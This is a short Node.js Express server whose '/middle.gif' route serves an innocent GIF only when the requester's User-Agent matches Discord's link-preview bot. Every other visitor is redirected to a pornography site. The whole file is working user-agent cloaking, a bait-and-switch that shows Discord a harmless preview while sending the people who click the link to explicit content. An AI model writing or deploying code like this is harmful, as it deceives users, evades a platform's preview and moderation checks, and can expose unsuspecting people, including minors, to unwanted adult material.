const express = require('express');
const path = require('path');
const app = express();

app.get('/middle.gif', (req, res, next) => {
  const userAgent = req.headers['user-agent'];
  
  if (userAgent === 'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)') {
    // Serve the GIF file
    const filePath = path.join(__dirname, 'public', 'middle.gif');
    res.sendFile(filePath);
  } else {
    // Redirect to another website
    res.redirect('https://pornhub.com');
  }
});

app.get('/', (req, res) => {
  res.send('Hello World!')
})

// Start the server
app.listen(80, () => {
  console.log('Server started on port 80');
});
